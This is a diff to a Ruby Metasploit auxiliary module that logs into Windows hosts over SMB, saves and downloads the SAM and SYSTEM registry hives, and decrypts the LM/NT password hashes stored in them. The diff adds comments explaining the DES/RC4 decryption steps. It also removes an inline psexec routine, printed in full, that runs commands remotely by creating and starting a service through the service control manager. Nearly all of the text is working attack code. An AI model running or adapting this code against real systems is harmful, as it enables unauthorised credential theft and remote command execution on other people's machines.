@@ -1,12 +1,12 @@
-#!/usr/bin/env ruby
-
 require 'msf/core'
 require 'rex/registry'
 require 'fileutils'
+require 'msf/core/exploit/psexec'
 
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
+	include Msf::Exploit::Remote::Psexec
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
@@ -42,11 +42,9 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	def peer
 		return "#{rhost}:#{rport}"
 	end
-
 
 
 	# This is the main controller function
@@ -56,7 +54,6 @@ class Metasploit3 < Msf::Auxiliary
 		logdir = datastore['LOGDIR']
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
-
 		if connect
 			begin
 				smb_login
@@ -64,7 +61,6 @@ class Metasploit3 < Msf::Auxiliary
 				print_error("#{ip} - #{autherror}")
 				return
 			end
-
 			if save_reg_hives(ip, sampath, syspath)
 				d = download_hives(smbshare, sampath, syspath, ip, logdir)
 				sys, sam = open_hives(logdir, ip, hives)
@@ -76,7 +72,6 @@ class Metasploit3 < Msf::Auxiliary
 			disconnect
 		end
 	end
-
 
 
 	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
@@ -94,7 +89,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
 	# To the local file path specified in datastore['LOGDIR'] on attacking system
 	def download_hives(smbshare, sampath, syspath, ip, logdir)
@@ -103,19 +97,16 @@ class Metasploit3 < Msf::Auxiliary
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-
 			# Get contents of hive file
 			remotesam = simple.open("\\WINDOWS\\Temp\\#{sampath}", 'rob')
 			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
 			samdata = remotesam.read
 			sysdata = remotesys.read
-
 			# Save it to local file system
 			localsam = File.open("#{logdir}/#{ip}/sam", "wb+")
 			localsys = File.open("#{logdir}/#{ip}/sys", "wb+")
 			localsam.write(samdata)
 			localsys.write(sysdata)
-
 			localsam.close
 			localsys.close
 			remotesam.close
@@ -128,7 +119,6 @@ class Metasploit3 < Msf::Auxiliary
 			return nil
 		end
 	end
-
 
 
 	# This is the cleanup method.  deletes copies of the hive files from the windows temp directory
@@ -145,7 +135,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# This method should open up a hive file from yoru local system and allow interacting with it
 	def open_hives(path, ip, hives)
 		begin
@@ -160,7 +149,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# This method taken from tools/reg.rb  thanks bperry for all of your efforts!!
 	def get_boot_key(hive)
 		begin
@@ -169,19 +157,16 @@ class Metasploit3 < Msf::Auxiliary
 			default_control_set = hive.value_query('\Select\Default').value.data.unpack("c").first
 			bootkey = ""
 			basekey = "\\ControlSet00#{default_control_set}\\Control\\Lsa"
-
 			%W{JD Skew1 GBG Data}.each do |k|
 				ok = hive.relative_query(basekey + "\\" + k)
 				return nil if not ok
 				tmp = ""
 				0.upto(ok.class_name_length - 1) do |i|
 					next if i%2 == 1
-
 					tmp << ok.class_name_data[i,1]
 				end
 				bootkey << [tmp].pack("H*")
 			end
-
 			keybytes = bootkey.unpack("C*")
 			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
 			scrambled = ""
@@ -196,29 +181,24 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# More code from tools/reg.rb
 	def get_hboot_key(sam, bootkey)
 		num = "0123456789012345678901234567890123456789\0"
 		qwerty = "!@#\$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
 		account_path = "\\SAM\\Domains\\Account"
 		accounts = sam.relative_query(account_path)
-
 		f = nil
 		accounts.value_list.values.each do |value|
 			if value.name == "F"
 				f = value.value.data
 			end
 		end
-
 		raise "Hive broken" if not f
-
 		md5 = Digest::MD5.digest(f[0x70,0x10] + qwerty + bootkey + num)
 		rc4 = OpenSSL::Cipher::Cipher.new('rc4')
 		rc4.key = md5
 		return rc4.update(f[0x80,0x20])
 	end
-
 
 
 	# Some of this taken from tools/reb.rb some of it is from hashdump.rb some of it is my own...
@@ -277,7 +257,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# Method extracts usernames from user keys, modeled after credddump
 	def get_user_name(user_key)
 		v = ""
@@ -286,10 +265,8 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		name_offset = v[0x0c, 0x10].unpack("<L")[0] + 0xCC
 		name_length = v[0x10, 0x1c].unpack("<L")[0]
-
 		return v[name_offset, name_length]
 	end
-
 
 
 	# More code from tools/reg.rb
@@ -307,7 +284,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# More code from tools/reg.rb
 	def get_user_hashes(user_key, hbootkey)
 		rid = user_key.name.to_i(16)
@@ -322,7 +298,6 @@ class Metasploit3 < Msf::Auxiliary
 		nt_hash = v[hash_offset + (lm_exists ? 24 : 8), 16] if nt_exists
 		return decrypt_hashes(rid, lm_hash || nil, nt_hash || nil, hbootkey)
 	end
-
 
 
 	# More code from tools/reg.rb
@@ -350,30 +325,31 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-
 	# This code is taken straight from hashdump.rb
+	# I added some comments for newbs like me to benefit from
 	def decrypt_hash(rid, hbootkey, enchash, pass)
 		begin
+			# Create two des encryption keys
 			des_k1, des_k2 = sid_to_key(rid)
-
 			d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
 			d1.padding = 0
 			d1.key = des_k1
-
 			d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
 			d2.padding = 0
 			d2.key = des_k2
-
+			#Create MD5 Digest
 			md5 = Digest::MD5.new
+			#Decrypt value from hbootkey using md5 digest
 			md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
-
+			#create rc4 encryption key using md5 digest
 			rc4 = OpenSSL::Cipher::Cipher.new('rc4')
 			rc4.key = md5.digest
+			#Run rc4 decryption of the hash
 			okey = rc4.update(enchash)
-
+			#Use 1st des key to decrypt first 8 bytes of hash
 			d1o  = d1.decrypt.update(okey[0,8])
 			d1o << d1.final
-
+			# Use second des key to decrypt second 8 bytes of hash
 			d2o  = d2.decrypt.update(okey[8,8])
 			d1o << d2.final
 			value = d1o + d2o
@@ -383,7 +359,6 @@ class Metasploit3 < Msf::Auxiliary
 			return desdecrypt
 		end
 	end
-
 
 
 	# More code from tools/reg.rb
@@ -398,14 +373,12 @@ class Metasploit3 < Msf::Auxiliary
 		s1 << s1[2]
 		s2 = s1[3] + s1[0] + s1[1] + s1[2]
 		s2 << s2[0] + s2[1] + s2[2]
-
 		return string_to_key(s1), string_to_key(s2)
 	end
 
 
 	# More code from tools/reg.rb
 	def string_to_key(s)
-
 		parity = [
 			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
 			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
@@ -424,7 +397,6 @@ class Metasploit3 < Msf::Auxiliary
 			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
 			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
 		]
-
 		key = []
 		key << (s[0].unpack('C')[0] >> 1)
 		key << ( ((s[0].unpack('C')[0]&0x01)<<6) | (s[1].unpack('C')[0]>>2) )
@@ -434,134 +406,12 @@ class Metasploit3 < Msf::Auxiliary
 		key << ( ((s[4].unpack('C')[0]&0x1F)<<2) | (s[5].unpack('C')[0]>>6) )
 		key << ( ((s[5].unpack('C')[0]&0x3F)<<1) | (s[6].unpack('C')[0]>>7) )
 		key << ( s[6].unpack('C')[0]&0x7F)
-
 		0.upto(7).each do |i|
 			key[i] = (key[i]<<1)
 			key[i] = parity[key[i]]
 		end
-
 		return key.pack("<C*")
 	end
 
 
-	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
-	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	def psexec(command)
-
-		simple.connect("IPC$")
-
-		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
-		vprint_status("#{peer} - Binding to #{handle} ...")
-		dcerpc_bind(handle)
-		vprint_status("#{peer} - Bound to #{handle} ...")
-
-		vprint_status("#{peer} - Obtaining a service manager handle...")
-		scm_handle = nil
-		stubdata =
-			NDR.uwstring("\\\\#{rhost}") +
-			NDR.long(0) +
-			NDR.long(0xF003F)
-		begin
-			response = dcerpc.call(0x0f, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				scm_handle = dcerpc.last_response.stub_data[0,20]
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		servicename = Rex::Text.rand_text_alpha(11)
-		displayname = Rex::Text.rand_text_alpha(16)
-		holdhandle = scm_handle
-		svc_handle = nil
-		svc_status = nil
-
-		stubdata =
-			scm_handle +
-			NDR.wstring(servicename) +
-			NDR.uwstring(displayname) +
-
-			NDR.long(0x0F01FF) + # Access: MAX
-			NDR.long(0x00000110) + # Type: Interactive, Own process
-			NDR.long(0x00000003) + # Start: Demand
-			NDR.long(0x00000000) + # Errors: Ignore
-			NDR.wstring( command ) +
-			NDR.long(0) + # LoadOrderGroup
-			NDR.long(0) + # Dependencies
-			NDR.long(0) + # Service Start
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0) # Password
-		begin
-			vprint_status("#{peer} - Creating the service...")
-			response = dcerpc.call(0x0c, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-				svc_status = dcerpc.last_response.stub_data[24,4]
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		vprint_status("#{peer} - Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception
-		end
-
-		vprint_status("#{peer} - Opening service...")
-		begin
-			stubdata =
-				scm_handle +
-				NDR.wstring(servicename) +
-				NDR.long(0xF01FF)
-
-			response = dcerpc.call(0x10, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		vprint_status("#{peer} - Starting the service...")
-		stubdata =
-			svc_handle +
-			NDR.long(0) +
-			NDR.long(0)
-		begin
-			response = dcerpc.call(0x13, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-			end
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-			return false
-		end
-
-		vprint_status("#{peer} - Removing the service...")
-		stubdata =
-			svc_handle
-		begin
-			response = dcerpc.call(0x02, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-		end
-			rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-		end
-
-		vprint_status("#{peer} - Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception => e
-			print_error("#{peer} - Error: #{e}")
-		end
-
-		select(nil, nil, nil, 1.0)
-		simple.disconnect("IPC$")
-		return true
-	end
 end
